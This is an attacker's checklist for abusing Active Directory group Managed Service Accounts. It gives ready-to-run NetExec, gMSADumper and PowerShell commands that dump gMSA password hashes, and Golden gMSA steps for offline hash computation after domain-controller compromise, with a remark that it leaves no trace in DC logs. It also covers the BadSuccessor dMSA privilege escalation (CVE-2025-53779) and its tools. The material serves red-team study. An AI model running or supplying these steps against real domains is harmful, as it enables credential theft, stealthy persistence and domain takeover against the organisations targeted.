# gMSA Abuse

## Before I start
- [ ] BloodHound edge ReadGMSAPassword on a gMSA, or I hold an account in the gMSA's PrincipalsAllowedToRetrieveManagedPassword
- [ ] Find the gMSAs: nxc ldap <DCIP> -u '<User>' -p '<Password>' --gmsa (or PowerView Get-DomainObject -LDAPFilter '(objectClass=msDS-GroupManagedServiceAccount)')

## Read the password blob
nxc ldap <DCIP> -u '<User>' -p '<Password>' -M gmsa
python3 gMSADumper.py -u '<User>' -p '<Password>' -d '<Domain>' -l <DCIP>
- [ ] Windows: Get-ADServiceAccount -Identity <gMSA> -Properties msDS-ManagedPassword then DSInternals ConvertFrom-ADManagedPasswordBlob
- [ ] Output is the NT hash of a long random password — use it as-is, cracking is pointless

## Golden gMSA (post-DA)
- [ ] Hold the KDS root key (DC compromise) → compute ANY gMSA's hash offline, forever, no LDAP query: GoldenGMSA.exe kdsinfo / gmsa compute
- [ ] Persistence angle: no replication traffic, nothing to see in DC logs

## BadSuccessor (dMSA, pre-Aug-2025 patches)
- [ ] Server 2025 DC + write on an OU → create dMSA with msDS-ManagedAccountPrecededByLink pointing at a privileged account → migrate → inherit its privileges (CVE-2025-53779)
- [ ] tooling: SharpSuccessor / NetExec badsuccessor module to check and abuse

## If it fails
- [ ] Access denied reading the blob → I'm not in the allowed principals; BloodHound path to one of them instead
- [ ] Windows LAPS-style encrypted blob on 2025 (dMSA) → need the decryption group

## Next
- [ ] gMSA hashes usually belong to service accounts with real reach: :Pb lateral-movement
- [ ] Service account with SPN + delegation configured: :Pb delegation
